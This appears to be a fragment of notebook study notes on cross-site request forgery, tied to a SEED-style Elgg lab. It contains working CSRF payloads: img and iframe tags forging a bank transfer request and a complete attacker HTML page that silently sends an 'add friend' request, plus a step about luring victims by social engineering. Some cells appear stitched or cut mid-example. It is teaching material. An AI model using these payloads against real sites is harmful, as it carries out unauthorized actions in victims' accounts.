    "This type of exploit happens on a malicious web page: when viewed by the victim, it sends a forged request to a targeted website on behalf of the victim. Since the request normally comes from a third-party web page, it is called cross-site request. <br>\n",
    "When a page from a website sends an HTTP request back to the website, it is called __same-site request__. If the request is sent to a different website, it is called __cross site request__. <br>\n",
    "If a website embeds an image from another website, then HTTP request used to fetch the image is a cross-site request. Online advertisers use cross-site requests to help display relevant advertisements to users, such that when the user visits the advertisements, they send HTTP request to the advertisement servers. \n",

    "HTTP GET request attach data in the URL, while POST request attach data in the body. Example of HTTP GET:\n",
    "```\n",
    "GET /post_form.php?foo=hello&bar=world HTTP/1.1 \n",
    "Host: www.example.com\n",
    "Cookie: SID=somecookies \n",
    "```\n",
    "The `foo=hello&bar=world` are parameters given to the HTTP request. <br>\n",

    "Cookie: SID=someothercookies\n",

    "foo=hello&bar=world\n",
    "```\n",

    "#### Example of an GET CSRF attack\n",
    "Consider online banking application at www.bank123.com that allows user to transfer money, via HTTP GET request such as:`http://www.bank123.com/transfer.php?to=3220&amount=500`. <br>\n",
    "But before the transfer, the user needs to log in, which creates an unique identification cookie for the user. Also, the HTTP GET must be a valid request. <br>\n",
    "If the attacker can get a victim to view attacker's website, they can send out a forged request from the victim's machine as a cross-site request, whereas the browser would not know it. <br> \n",
    "For GET request, the attacker can embed the following HTML in its own page: \n",
    "```\n",
    "<img src=\"http://www.bank123.com/transfer.php?to=3220&amount=500\"> \n",
    "<iframe src=\"http://www.bank123.com/transfer.php?to=3220&amount=500\"> </iframe> \n",
    "```\n",
    "The code above indicates that when the website is loaded by the browser, these tags can trigger HTTP GET requests being sent to the URLs specified in the `src` attribute.\n",
    "\n",
    "#### Attack Procedures:\n",
    "* understand how the web application works: use Firefox `LiveHTTPHeader` extension to capture the HTTP GET request. \n",
    "* example in lab is to create a new account under `Elgg` and get the parameters for 'add friend' request. \n",
    "* `__egg_ts__` and `__egg_token_` are used against the CSRF attack. \n",
    "* the attacker does not need to worry about session cookie.\n",
    "* Then, the attacker need to create a malicious webpage: \n",
    "```\n",
    "<html>\n",
    "   <body>\n",
    "       <h1> this page forges HTTP GET request </h1>\n",
    "       <img src=\"http://www.csrfllabelgg.com/action/friends/add?friend=42\" \n",
    "            alt=\"image\" width=\"1\" height=\"1\" /> \n",
    "   </body>\n",
    "</html> \n",
    "```\n",
    "the `img` tag ensures that when browser visits the page, HTTP GET request is sent automatically. The page can be hosted locally, on `www.csrflbattacker.com`, under the `/var/www/CSRF/Attacker` folder. \n",
    "* To attract the user to visit the attacker's site, the attacker could simply send the URL to the victim, or via some social engineering. "
